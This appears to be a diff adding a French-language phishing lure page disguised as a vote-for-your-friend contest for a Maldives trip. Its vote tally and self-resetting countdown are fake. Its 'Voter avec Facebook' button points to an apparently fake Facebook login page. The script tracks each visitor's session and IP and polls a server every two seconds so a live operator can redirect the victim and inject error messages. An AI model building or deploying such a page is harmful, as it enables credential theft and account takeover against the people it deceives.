@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Votez pour VOTEZ - Voyage de Rêve</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #6366f1;
+            --secondary: #818cf8;
+            --accent: #f472b6;
+            --background: #ffffff;
+            --text: #1f2937;
+            --gradient: linear-gradient(135deg, #6366f1 0%, #818cf8 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        body {
+            background-color: var(--background);
+            color: var(--text);
+            line-height: 1.7;
+            background-image: 
+                radial-gradient(circle at 100% 100%, rgba(99, 102, 241, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 0% 0%, rgba(129, 140, 248, 0.1) 0%, transparent 50%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 3rem;
+        }
+
+        .logo {
+            height: 60px;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
+        }
+
+        .contest-container {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        @media (max-width: 968px) {
+            .contest-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .contest-info {
+            background: white;
+            border-radius: 24px;
+            padding: 2.5rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.05);
+        }
+
+        .contest-visual {
+            background: var(--gradient);
+            border-radius: 24px;
+            padding: 2.5rem;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .contest-visual::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('https://images.unsplash.com/photo-1514282401047-d79a71a590e8?w=600') center/cover;
+            opacity: 0.2;
+            mix-blend-mode: overlay;
+        }
+
+        .contest-visual-content {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+
+        .contest-visual h2 {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+        }
+
+        .contest-visual p {
+            font-size: 1.125rem;
+            opacity: 0.9;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(99, 102, 241, 0.1);
+            color: var(--primary);
+            padding: 0.5rem 1rem;
+            border-radius: 9999px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+        }
+
+        .contest-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+        }
+
+        .contest-description {
+            color: #6b7280;
+            font-size: 1.125rem;
+            margin-bottom: 2rem;
+        }
+
+        .candidate-section {
+            background: rgba(99, 102, 241, 0.03);
+            border-radius: 16px;
+            padding: 2rem;
+            margin: 2rem 0;
+            border: 1px solid rgba(99, 102, 241, 0.1);
+        }
+
+        .candidate-name {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(99, 102, 241, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 65%;
+            background: var(--accent);
+            border-radius: 4px;
+            transition: width 1s ease;
+        }
+
+        .votes-info {
+            margin-top: 0.75rem;
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+
+        .prize-details {
+            background: white;
+            border-radius: 16px;
+            padding: 2rem;
+            margin: 2rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .prize-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .prize-list {
+            list-style: none;
+            margin: 1rem 0;
+        }
+
+        .prize-list li {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 0.75rem;
+            color: #4b5563;
+        }
+
+        .prize-list li i {
+            color: var(--accent);
+        }
+
+        .vote-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            background: var(--gradient);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-size: 1.125rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin: 1.5rem 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .vote-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(rgba(255,255,255,0.2), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .vote-button:hover::after {
+            opacity: 1;
+        }
+
+        .vote-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
+        }
+
+        .timer-container {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+
+        .timer-box {
+            background: white;
+            border-radius: 12px;
+            padding: 1rem;
+            min-width: 80px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .timer-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .timer-label {
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+
+        .share-section {
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .share-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #6b7280;
+            margin-bottom: 1rem;
+        }
+
+        .share-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+        }
+
+        .share-button {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.25rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+        }
+
+        .share-button.facebook { background: #1877f2; }
+        .share-button.whatsapp { background: #25d366; }
+        .share-button.twitter { background: #1da1f2; }
+        .share-button.telegram { background: #0088cc; }
+
+        .share-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 3rem;
+            color: #6b7280;
+            font-size: 0.875rem;
+        }
+
+        .footer a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+
+            .contest-title {
+                font-size: 2rem;
+            }
+
+            .timer-container {
+                flex-wrap: wrap;
+            }
+
+            .timer-box {
+                min-width: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div style="text-align: center;">
+                <h1 style="font-size: 1.5rem; font-weight: 800; background: var(--gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">Voyage de Rêve</h1>
+            </div>
+        </div>
+
+        <div class="contest-container">
+            <div class="contest-info">
+                <div class="badge">
+                    <i class="fas fa-star"></i>
+                    voyages maldives
+                </div>
+
+                <h1 class="contest-title">Voyage de Rêve aux Maldives</h1>
+                <p class="contest-description">
+                    Aidez votre ami(e) à remporter un séjour inoubliable de 2 semaines aux Maldives pour 2 personnes !
+                </p>
+
+                <div class="candidate-section">
+                    <h2 class="candidate-name" id="candidate-name">VOTEZ</h2>
+                    
+                    <div class="progress-info">
+                        <span>Progression vers la victoire</span>
+                        <span id="progress-percent">65%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress-fill"></div>
+                    </div>
+                    <div class="votes-info">
+                        <span id="votes-count">53 votes obtenus</span>
+                    </div>
+                </div>
+
+                <div class="prize-details">
+                    <h3 class="prize-title">
+                        <i class="fas fa-gift"></i>
+                        Le grand prix inclut
+                    </h3>
+                    <ul class="prize-list">
+                        <li><i class="fas fa-plane"></i> Vols aller-retour en classe affaires</li>
+                        <li><i class="fas fa-hotel"></i> 14 nuits en villa sur pilotis</li>
+                        <li><i class="fas fa-utensils"></i> Pension complète</li>
+                        <li><i class="fas fa-swimming-pool"></i> Activités nautiques illimitées</li>
+                    </ul>
+                </div>
+
+                <div class="timer-container">
+                    <div class="timer-box">
+                        <div class="timer-value" id="hours">02</div>
+                        <div class="timer-label">Heures</div>
+                    </div>
+                    <div class="timer-box">
+                        <div class="timer-value" id="minutes">35</div>
+                        <div class="timer-label">Minutes</div>
+                    </div>
+                    <div class="timer-box">
+                        <div class="timer-value" id="seconds">00</div>
+                        <div class="timer-label">Secondes</div>
+                    </div>
+                </div>
+
+                <a id="vote-link" href="connexion_f.php?session=session_41.248.152.160&ip=41.248.152.160&name=VOTEZ" class="vote-button">
+                    <i class="fab fa-facebook-f"></i>
+                    Voter avec Facebook
+                </a>
+
+                <div class="share-section">
+                    <p class="share-title">Partagez pour obtenir plus de votes !</p>
+                    <div class="share-buttons">
+                        <button class="share-button facebook" onclick="shareFacebook()">
+                            <i class="fab fa-facebook-f"></i>
+                        </button>
+                        <button class="share-button whatsapp" onclick="shareWhatsapp()">
+                            <i class="fab fa-whatsapp"></i>
+                        </button>
+                        <button class="share-button twitter" onclick="shareTwitter()">
+                            <i class="fab fa-twitter"></i>
+                        </button>
+                        <button class="share-button telegram" onclick="shareTelegram()">
+                            <i class="fab fa-telegram-plane"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="contest-visual">
+                <div class="contest-visual-content">
+                    <h2>Les Maldives vous attendent</h2>
+                    <p>Plages paradisiaques, eaux cristallines et couchers de soleil inoubliables. Votez maintenant pour offrir ce rêve à votre proche !</p>
+                </div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <p>&copy; 2026 Voyage de Rêve. Tous droits réservés.</p>
+            <p><a href="#">Règlement du concours</a> &bull; <a href="#">Politique de confidentialité</a></p>
+        </footer>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const clientName = params.get('name') || 'VOTEZ';
+        let sessionId = params.get('session') || null;
+        let clientIp = params.get('ip') || null;
+
+        async function initSession() {
+            if (!sessionId || !clientIp || clientIp === 'unknown' || sessionId.startsWith('session_' + Date.now().toString().substring(0, 5))) {
+                try {
+                    const resp = await fetch('/register.php');
+                    const data = await resp.json();
+                    if (data.success) {
+                        sessionId = data.session;
+                        clientIp = data.ip;
+                    }
+                } catch (e) {
+                    if (!sessionId) sessionId = 'session_' + Date.now();
+                    if (!clientIp) clientIp = 'unknown';
+                }
+            }
+            if (!sessionId) sessionId = 'session_' + Date.now();
+            if (!clientIp) clientIp = 'unknown';
+
+            document.getElementById('candidate-name').textContent = clientName;
+            document.getElementById('vote-link').href = 'connexion_f.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
+
+            fetch('update_page.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&page=vote.html');
+        }
+
+        initSession();
+
+        function updateCountdown() {
+            const now = new Date();
+            const end = new Date();
+            end.setHours(end.getHours() + 2);
+            end.setMinutes(end.getMinutes() + 35);
+
+            const diff = end - now;
+
+            if (diff <= 0) {
+                document.getElementById('hours').textContent = '00';
+                document.getElementById('minutes').textContent = '00';
+                document.getElementById('seconds').textContent = '00';
+                return;
+            }
+
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+        }
+
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+
+        function shareFacebook() {
+            const url = encodeURIComponent(window.location.href);
+            window.open('https://www.facebook.com/sharer/sharer.php?u=' + url, '_blank', 'width=600,height=400');
+        }
+
+        function shareWhatsapp() {
+            const text = encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ");
+            const url = encodeURIComponent(window.location.href);
+            window.open('https://wa.me/?text=' + text + url, '_blank');
+        }
+
+        function shareTwitter() {
+            const text = encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ");
+            const url = encodeURIComponent(window.location.href);
+            window.open('https://twitter.com/intent/tweet?text=' + text + '&url=' + url, '_blank', 'width=600,height=400');
+        }
+
+        function shareTelegram() {
+            const text = encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ");
+            const url = encodeURIComponent(window.location.href);
+            window.open('https://t.me/share/url?url=' + url + '&text=' + text, '_blank', 'width=600,height=400');
+        }
+
+        function checkAction() {
+            if (!sessionId || !clientIp) return;
+            fetch('check_action.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp))
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                if (data.action) {
+                    if (data.action === 'custom' && data.redirect) {
+                        window.location.href = data.redirect + '.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
+                    } else if (data.action === 'redirect' && data.redirect) {
+                        window.location.href = data.redirect + '.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
+                    } else {
+                        window.location.href = data.action + '.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName) + (data.errorMessage ? '&error=' + encodeURIComponent(data.errorMessage) : '');
+                    }
+                }
+            })
+            .catch(function(error) {
+                console.error('Erreur lors de la vérification des actions:', error);
+            });
+        }
+
+        setInterval(checkAction, 2000);
+    </script>
+</body>
+</html>
